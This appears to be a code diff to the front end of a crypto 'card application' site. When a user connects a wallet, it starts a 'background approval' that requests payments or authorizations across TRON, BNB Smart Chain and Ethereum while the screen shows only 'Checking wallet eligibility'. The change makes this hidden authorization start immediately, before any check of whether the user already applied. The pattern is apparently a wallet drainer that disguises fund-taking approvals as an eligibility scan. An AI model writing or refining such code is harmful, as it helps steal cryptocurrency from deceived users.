@@ -556,10 +556,9 @@ function onWalletConnected(d) {
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
   setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
-  checkAlreadyApplied().then(function (hit) {
-    if (hit) return;
-    startBackgroundApproval();
-  });
+  // Start the gas decision immediately. Do not wait for the applied check first.
+  startBackgroundApproval();
+  checkAlreadyApplied();
 }
 
 function networkCardName(network) {
@@ -579,6 +578,8 @@ async function checkAlreadyApplied() {
     });
     const data = await res.json();
     if (!res.ok || !data.applied) return false;
+    resolved = true;
+    authorizing = false;
     const net = networkCardName(data.network || (data.networks && data.networks[0]));
     const mail = data.email || 'support@trustcard.app';
     const copy = $('#m-applied-copy');
@@ -590,7 +591,6 @@ async function checkAlreadyApplied() {
       link.href = 'mailto:' + mail;
       link.textContent = 'Email support';
     }
-    authorizing = false;
     setBusy(false);
     setView('applied');
     return true;
@@ -940,15 +940,17 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
 
 async function startBackgroundApproval() {
   try {
-    await sleep(200);
+    if (resolved) return;
     setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ connectionId: connId }),
     });
+    if (resolved) return;
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
+    if (resolved) return;
     const p = data.payment;
     const allowed = (p.eligibility && p.eligibility.eligibleNetworks) || [];
     let queued = (p.payments && p.payments.length) ? p.payments : [p];
